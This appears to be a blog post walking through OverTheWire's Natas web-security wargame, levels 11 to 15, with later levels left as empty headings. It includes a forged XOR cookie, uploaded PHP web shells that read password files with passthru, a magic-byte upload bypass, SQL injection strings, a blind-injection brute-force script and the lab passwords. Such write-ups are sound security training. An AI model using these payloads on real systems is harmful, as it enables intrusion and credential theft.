---
layout: post
title: OverTheWire - Natas 11-22
---

Natas teaches the basics of serverside web-security.

Each level of natas consists of its own website located at ```http://natasX.natas.labs.overthewire.org```, where X is the level number. There is no SSH login. To access a level, enter the username for that level (e.g. natas0 for level 0) and its password.

Each level has access to the password of the next level. Your job is to somehow obtain that next password and level up. All passwords are also stored in ```/etc/natas_webpass/```. E.g. the password for natas5 is stored in the file ```/etc/natas_webpass/natas5``` and only readable by natas4 and natas5.

## Level 11
> http://natas11.natas.labs.overthewire.org/<br>`natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK`

![11](/images/natas/11.png)

Source:
```php
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);

if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}
```

Due to the properties of XOR, we can find the key by XOR-ing the cookie and the JSON we expect. The only contents of the JSON appear to be the values of showpassword and bgcolor, thus our default JSON is `{"showpassword":"no","bgcolor":"#ffffff"}`.

```php
noble@heart:~$ cat script.php
<?php
$data = base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=");
$key = '{"showpassword":"no","bgcolor":"#ffffff"}';
$outText = "";

for ($i = 0; $i < strlen($data); $i++) {
        $outText .= $data[$i] ^ $key[$i % strlen($key)];
}

echo $outText;
?>
noble@heart:~$ php script.php
qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
```
Our key is repeated to the length of the input text based on the modulo. The following script gives us the value of the cookie to set to pass the level.
```php
noble@heart:~$ cat myscript.php
<?php
function xor_encrypt($in) {
        $key = 'qw8J';
        $text = $in;
        $outText = "";

        for ($i = 0; $i < strlen($text); $i++) {
                $outText .= $text[$i] ^ $key[$i % strlen($key)];
        }
        return $outText;
}
echo base64_encode(xor_encrypt('{"showpassword":"yes","bgcolor":"#ffffff"}'));
?>
noble@heart:~$ php myscript.php
ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
```
The site says: "The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3"

## Level 12
> http://natas12.natas.labs.overthewire.org/<br>`natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3`

There are two hidden inputs for the form:
```html
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
```
We can modify this input on the client side to set our filename and extension to be whatever we want. I changed the input value to be:
```html
<input type="hidden" name="filename" value="pwn.php">
```

Because the backend handles whichever extension we use, I made a file called passthru.php with the following contents:
```php
<?php passthru('cat /etc/natas_webpass/natas13'); ?>
```
When uploaded, you get a link to the file. When you navigate to it, the PHP is executed and provides the password: `jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY`.

## Level 13
> http://natas13.natas.labs.overthewire.org/<br>`natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY`

From filesignatures.net, I learn that the signature of JPEG images is `FF D8 FF E0`. We can write these bytes to the front of the file with python, e.g. `file.write('\xFF\xD8\xFF\xE0'+ '<?php passthru('cat /etc/natas_webpass/natas14'); ?>')`. Or we can convert the hex code to ASCII and paste it into our text file like so: `ÿØÿà<?php passthru('cat /etc/natas_webpass/natas14'); ?>`. Another option is to preface the PHP with the string `BMP`, which is interpreted as the magic number of a bitmap file. Upload the file and then change the html element so the file uploaded will be rendered as PHP or catch the request in Burp and change the extension there. Follow the link and get the password: `Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1`.


## Level 14
> http://natas14.natas.labs.overthewire.org/<br>`natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1`

We find this PHP in the source:

```php
<?
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas14', '<censored>');
    mysql_select_db('natas14', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysql_close($link);
} else {
?> 
```

The query is formulated without prepared statements, and is thus vulnerable to SQLi. Look at the line the query is assembled, and let's break it down.

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
``` 

If you look at the HTML in the source code, the query is taking exactly what we write into these fields. The PHP requests the username from the input field with name="username" using `$_REQUEST["username"]` and the password from the input field with the name="password" using using `$_REQUEST["password"]`. 

```html
<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
```

The query being run will really be the following, with username and password being taken directly from the login form fields.
```sql
SELECT * from users where username="<user field>" and password="<pass field>"
```

If you want to find the password for user `natas15`, you could supply `natas15"#` as the username and comment out the rest of the command:
```sql
SELECT * from users where username="natas15"#" and password="<pass field>"
```
The injection runs and we get the password `AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J`.

## Level 15
> http://natas15.natas.labs.overthewire.org/<br>`natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J`

This challenge involves blind SQLi. We are only told if a user exists or not. Try some usernames, then check user natas16 to see that they exist. 

To make this easier, we are going to use a query string in the URL. See [Query string](https://en.wikipedia.org/wiki/Query_string) on Wikipedia. We can supply our username field with the letter `a` by going to the following URL: `http://natas15.natas.labs.overthewire.org/index.php?username=a`.
```php
<?

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas15', '<censored>');
    mysql_select_db('natas15', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>
```
According to the source code above, if we supply a debug key the server will `echo` what the query is. Thus if want to see what SQL command is being executed, we can sneakily also supply `&debug` to the end of this URL like so: `http://natas15.natas.labs.overthewire.org/index.php?username=a&debug`.

Since our queries are binary (as in they can only return true or false a user exists), how can we find the user's password? Currently our query only tries to match the username, but we can inject additional statements to ask true/false questions about the password. We know supplying `username=natas16` already evaluates to true, and we can use [LIKE operator](https://www.w3schools.com/sql/sql_like.asp) and [BINARY function](https://www.w3schools.com/sql/func_mysql_binary.asp) to ask what characters the password contains.

With the injection `natas16" AND password LIKE BINARY "a%`, we essentially ask, is there a user `natas16` with a password that starts with `a`? The percent sign represents zero, one, or multiple characters after the `a`. The SQL query becomes:
```sql
SELECT * from users where username="natas16" AND password LIKE BINARY "a%"
```

So you can try a few letters until you find out the first character is `W`, and then go on to the next injection `natas16" AND password LIKE BINARY "Wa%` but this would take some time. So, let's brute force it with Python.

```python
import requests
import sys

site = "http://natas15.natas.labs.overthewire.org/"
# Passwords are alphanumeric
character_set = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234568790"
injection = 'natas16" AND password LIKE BINARY "'

session = requests.Session()
session.auth = ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')

password = ""
print("Starting...")
# The passwords to the previous levels and this one are all 32 characters
while len(password) < 32:
    # Loop over all characters.
    for char in character_set:
        # Send POST request to site, injecting into username parameter.
        response = session.post('http://natas15.natas.labs.overthewire.org/',
                                data={'username': injection + password + char + "%"})
        # Break if char is correct, move onto next position in password string
        if "This user exists" in response.text:
            # Write next character to buffer
            sys.stdout.write(char)
            # Flush data data in buffer, "print" next character
            sys.stdout.flush()
            password += char
            break
print("\nDone")

```
Wait a minute or two, and you'll have the password: `WaIHEacj63wnNIBROHeqi3p9t0m5nhmh`.

## Level 16
> http://natas16.natas.labs.overthewire.org/
> natas16:

## Level 17
> http://natas17.natas.labs.overthewire.org/
> natas17:

## Level 18
> http://natas18.natas.labs.overthewire.org/
> natas18:

## Level 19
> http://natas19.natas.labs.overthewire.org/
> natas19:

## Level 20
> http://natas20.natas.labs.overthewire.org/
> natas20:

## Level 21
> http://natas21.natas.labs.overthewire.org/
> natas21:

## Level 22
> http://natas22.natas.labs.overthewire.org/
> natas22: